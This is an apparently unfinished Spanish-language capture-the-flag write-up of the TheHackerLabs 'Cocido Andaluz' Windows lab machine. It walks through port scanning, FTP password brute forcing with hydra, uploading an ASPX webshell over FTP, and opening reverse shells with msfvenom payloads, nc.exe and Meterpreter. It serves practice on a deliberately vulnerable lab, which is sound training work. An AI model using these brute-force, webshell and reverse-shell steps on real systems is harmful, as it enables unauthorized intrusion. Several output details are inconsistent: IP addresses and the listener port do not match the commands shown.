---
layout: single
title: Cocido Andaluz - TheHackerLabs
excerpt: "."
date: 2025-02-03
classes: wide
header:
  teaser: /assets/images/THL-writeup-/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Easy Machine
tags:
  - Windows
  - 
  - 
  - 
---
![](/assets/images/THL-writeup-/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Hosts">Descubrimiento de Hosts</h2>

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Nmap scan report for 192.168.1.80
Host is up (0.00020s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for Tu_IP
Host is up.
Nmap done: 256 IP addresses (14 hosts up) scanned in 2.43 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.213	XX	PCS Systemtechnik GmbH

14 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.179 seconds (117.49 hosts/sec). 14 responded
```

Encontramos nuestro objetivo y es:`192.168.1.80`

<br>

<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.80
PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
64 bytes from 192.168.1.80: icmp_seq=1 ttl=128 time=2.91 ms
64 bytes from 192.168.1.80: icmp_seq=2 ttl=128 time=0.947 ms
64 bytes from 192.168.1.80: icmp_seq=3 ttl=128 time=0.952 ms
64 bytes from 192.168.1.80: icmp_seq=4 ttl=128 time=0.945 ms

--- 192.168.1.80 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3088ms
rtt min/avg/max/mdev = 0.945/1.438/2.908/0.848 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.80 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:44 CST
Initiating ARP Ping Scan at 12:44
Scanning 192.168.1.80 [1 port]
Completed ARP Ping Scan at 12:44, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:44
Scanning 192.168.1.80 [65535 ports]
Discovered open port 80/tcp on 192.168.1.80
Discovered open port 139/tcp on 192.168.1.80
Discovered open port 445/tcp on 192.168.1.80
Discovered open port 135/tcp on 192.168.1.80
Discovered open port 21/tcp on 192.168.1.80
Discovered open port 49158/tcp on 192.168.1.80
Discovered open port 49154/tcp on 192.168.1.80
Discovered open port 49155/tcp on 192.168.1.80
Discovered open port 49156/tcp on 192.168.1.80
Discovered open port 49157/tcp on 192.168.1.80
Discovered open port 49153/tcp on 192.168.1.80
Discovered open port 49152/tcp on 192.168.1.80
Completed SYN Stealth Scan at 12:45, 50.41s elapsed (65535 total ports)
Nmap scan report for 192.168.1.80
Host is up, received arp-response (0.0038s latency).
Scanned at 2025-02-03 12:44:39 CST for 50s
Not shown: 38898 filtered tcp ports (no-response), 26625 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 128
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
49158/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 50.68 seconds
           Raw packets sent: 220613 (9.707MB) | Rcvd: 26642 (1.066MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Bien, parece que esta activa una página web en el **puerto 80** y veo activo el **servicio FTP** en el **puerto 21**, quizá esten relacionados, pero eso lo veremos más adelante.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 192.168.1.80 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:47 CST
Nmap scan report for 192.168.1.80
Host is up (0.0013s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 7.0
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-JG67MIHZH2X, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-02-03T18:48:09
|_  start_date: 2025-02-03T10:36:35
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.65 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Se me hace bastante curioso que tiene desplegado **Apache**, cuando normalmente es **IIS o HFS** o algo relacionado a **Windows**. Además, parece que el **servicio SMB** no nos pide credenciales para conectarnos.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura1.png">
</p>

Tenemos la página por defecto de **Apache**.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura2.png">
</p>

No veo nada que nos sirva.

Te diría que aplicaramos **Fuzzing**, pero en mi caso no encontre nada, por lo que vamos a saltarnos esa parte.

Vamos a ver si podemos entrar al **servicio FTP**.

<br>

<h2 id="FTP">Analizando Servicio FTP</h2>

Si revisamos el **escaneo de nmap**, no mostro información sobre este servicio, así que vamos a usar un script de **nmap** para ver si existe el usuario anonymous para poder loguearnos:
```bash
nmap -p 21 --script ftp-anon 192.168.1.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:14 CST
Nmap scan report for 192.168.1.80
Host is up (0.00092s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```
No encontro nada y podremos hacer nada tampoco.

Por ahora, vamos a dejar este servicio.

<br>

<h2 id="SMB">Analizando Servicio SMB</h2>

Veamos que información nos da **crackmapexec**:
```bash
crackmapexec smb 192.168.1.80
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
```
Como nos mostró el escaneo, parece que no pide credenciales para poder loguearnos.

Veamos si podemos listar los archivos compartidos con **smbclient**:
```bash
smbclient -L //192.168.1.80// -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.100.213 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Parece que si puede loguearse con un usuario anonimo, pero no esta mostrando nada.

De pura casualidad, probemos si podemos ver algo con **smbmap**:
```bash
smbmap -H 192.168.1.80
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
.
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Access denied on 192.168.100.213, no fun for you...                                                                  
[*] Closed 1 connections
```
Nada tampoco.

Te diría que fueramos a analizar el **servicio RPC**, pero tampoco podremos hacer algo.

Lo que queda, es hacer fuerza bruta.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</h2>

Vamos a empezar aplicando fuerza bruta al **servicio FTP**, pero al no tener un usuario, debemos específicar un diccionario de usuarios.

Yo usare el diccionario de usuarios de **seclists**, que debería esta en la ruta: `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.

Esta vez, usaremos otro diccionario para las contraseñas, ya que **rockyou.txt** tarda demasiado y no encuentra la contraseña, este será: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt`.

Apliquemos el ataque con **hydra**:
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.1.80 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-03 13:50:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43048882131570 login tries (l:8295455/p:5189454), ~2690555133224 tries per task
[DATA] attacking ftp://192.168.1.80:21/
[STATUS] 4305.00 tries/min, 4305 tries in 00:01h, 43048882127265 to do in 166662338:52h, 16 active
[21][ftp] host: 192.168.1.80   login: info   password: PolniyPizdec0211
...
```
Excelente, vamos a comprobar con **crackmapexec** si son válidos.

Primero con el **servicio FTP**:
```bash
crackmapexec ftp 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
FTP         192.168.1.80 21     192.168.1.80  [*] Banner: Microsoft FTP Service
FTP         192.168.1.80 21     192.168.1.80  [+] info:PolniyPizdec0211
```
Si funcionan.

Ahora con el **servicio SMB**:
```bash
crackmapexec smb 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [+] WIN-JG67MIHZH2X\info:PolniyPizdec0211
```
Tambien funcionan.

Ahora podemos entrar al **servicio FTP** y al **servicio SMB**, aunque en **SMB** no encontraremos nada, así que vamos directo con **FTP**.

<br>

<h2 id="">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</h2>

Entremos al **servicio FTP**:
```batch
ftp info@192.168.1.80
Connected to 192.168.1.80.
220 Microsoft FTP Service
331 Password required for info.
Password: 
230 User info logged in.
Remote system type is Windows_NT.
ftp>
```
Estamos dentro.

Veamos que archivos hay aquí:
```batch
ftp> ls
227 Entering Passive Mode (192,168,100,213,192,7).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
ftp>
```
Excelente, parece que por aquí podremos subir archivos y serán representados en la página web.

Vamos a probar subiendo un archivo de texto random:
```batch
ftp> put prueba.txt
local: prueba.txt remote: prueba.txt
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|    20       23.33 KiB/s    --:-- ETA
226 Transfer complete.
20 bytes sent in 00:00 (0.40 KiB/s)
ftp> ls
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group              20 Feb  3 21:13 prueba.txt
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
```
Ahí esta.

Ahora vamos a ver si aparece en la página web:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura3.png">
</p>

Se puede ver.

Sabiendo esto y que la máquina usa un **servidor IIS** y **ASP.NET**, podemos usar una **webshell** tipo **ASPX** que sirva como una **CMD**.

En kali ya tenemos una:
```bash
locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
```

Copiamos cualquiera de esos dos en tu directorio actual de trabajo y lo subimos al **FTP**:
```batch
ftp> put aspx_cmd.aspx
local: aspx_cmd.aspx remote: aspx_cmd.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  1438       47.28 MiB/s    --:-- ETA
226 Transfer complete.
1438 bytes sent in 00:00 (33.16 KiB/s)
ftp>
```

Y vayamos a la página web, especificando el archivo:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura4.png">
</p>

Ahí esta, ya solo ejecuta un comando:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura5.png">
</p>

Listo, tenemos una WebShell que podemos usar para conectarnos a la máquina víctima.

<br>

<h2 id="">Conectandonos a la Máquina Víctima con Distintos Metodos</h2>

Vamos a realizar al menos 4 formas en las que podemos ganar acceso a la máquina.

2 de ellas, ya las he realizado en la **máquina Devel**

Puedes elegir cualquiera de estas para continuar.

<br>

<h3 id="RevShell">Creando una Reverse Shell de ASPX con msfvenom</h3>

Vamos a generar una **Reverse Shell** con formato **ASPX** utilizando **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2736 bytes
Saved as: shell.aspx
```

Vamos a cargar el archivo al **FTP**, pero con el modo binario para que no se llegue modificar nada durante la transferencia:
```batch
ftp> binary
200 Type set to I.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  2774       75.58 MiB/s    --:-- ETA
226 Transfer complete.
2774 bytes sent in 00:00 (59.81 KiB/s)
```

Ahora, con **rlwrap** usamos **netcat** para abrir un listener y esperar a obtener la **Reverse Shell**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Y ya solo nos metemos al archivo que cargamos desde la página web y ya obtendremos la conexión:
```batch
rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49184
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\servicio de red
```
Estamos dentro.

<br>

<h3 id="BinNC">Cargando y Utilizando Binario nc.exe para Obtener Conexión</h3>

Dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.

Buscala y copiala en tu directorio actual de trabajo:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Una vez que la tengas copiada, transfierela al **FTP**:
```batch
ftp> binary
200 Type set to I.
ftp> put nc.exe
local: nc.exe remote: nc.exe
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************| 59392       16.26 MiB/s    00:00 ETA
226 Transfer complete.
59392 bytes sent in 00:00 (1.51 MiB/s)
```

Bien, ya esta dentro del **FTP**, pero para poder usarla, necesitas específicar la ruta en donde se encuentra el binario y es posible que se encuentre en 2 lugares:
* `C:\inetpub\wwwroot\`
* `C:\inetpub\ftproot\`

Aunque normalmente es la primer ruta.

Usa **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Desde la **WebShell** usa el siguiente comando que usara el binario de **netcat**, para mandar una **CMD** a nuestra máquina:
```batch
C:\inetpub\wwwroot\nc.exe cmd -e Tu_IP 443
```

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura6.png">
</p>

Y observa la conexión obtenida:
```batch
rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49185
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.

c:\windows\system32\inetsrv>
```
Listo, estamos dentro.

<br>

<h3 id="RevShell2">Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX</h3>

Vamos a crear una **Reverse Shell** con **msfvenom**, especificando que será un payload para obtener una sesión de **meterpreter**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4444 -f aspx -o meterpreterShell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2867 bytes
Saved as: meterpreterShell.aspx
```

Ahora, vamos a automatizar la obtención del handler que nos da la sesión del **meterpreter**, metiendo los comandos en un script de LUA:
```bash
nano handler.rc
---------------
USE exploit/multi/handler
set LHOST Tu_IP
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

Ejecutamos el script con **Metasploit**:
```bash
msfconsole -q -r handler.rc
[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set LHOST Tu_IP
LHOST => Tu_IP
resource (handler.rc)> set LPORT 4444
LPORT => 5555
resource (handler.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (handler.rc)> exploit
[*] Started reverse TCP handler on Tu_IP:4444
```

Vamos a cargar nuestra **Reverse Shell** al **FTP**:
```batch
ftp> binary
200 Type set to I.
ftp> put meterpreterShell.aspx 
local: meterpreterShell.aspx remote: meterpreterShell.aspx
227 Entering Passive Mode (192,168,1,80).
125 Data connection already open; Transfer starting.
100% |*********************************************|  2867       20.25 MiB/s    00:00 ETA
226 Transfer complete.
2867 bytes sent in 00:00 (65.27 KiB/s)
```

Ya solamente entramos en nuestro archivo desde la página web:

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura7.png">
</p>

Y ya tendremos nuestra sesión de **meterpreter**:
```bash
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Sending stage (177734 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.80:49187) at 2025-02-03 21:30:19 -0600
.
meterpreter > getuid
Server username: NT AUTHORITY\Servicio de red
meterpreter > sysinfo
Computer        : WIN-JG67MIHZH2X
OS              : Windows Server 2008 (6.0 Build 6001, Service Pack 1).
Architecture    : x86
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

<br>

<h3 id="BinNC2">Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión</h3>

Como mencione antes, dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.

Buscala y copiala en tu directorio actual de trabajo:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Desde tu directorio actual de trabajo, vamos a levantar el **servicio SMB** para que podamos usar el **binario nc.exe** desde la **WebShell**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
.
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Usa **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nvlp 443
listening on [any] 443 ...
```

Por último, vamos a usar nuestro **Servicio SMB** para poder usar remotamente el **binario nc.exe** y mandar una conexión hacia nuestra máquina:
```batch
\\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443
```

<p align="center">
<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura8.png">
</p>

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49160
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\servicio de red
```

Ya solo podemos obtener la flag del usuario:
```batch
c:\windows\system32\inetsrv>cd C:\Users\info
cd C:\Users\info
.
C:\Users\info>type user.txt
...
```


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="EnumWin">Enumeración de Máquina Víctima</h2>




<h2 id=""></h2>


<h2 id=""></h2>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
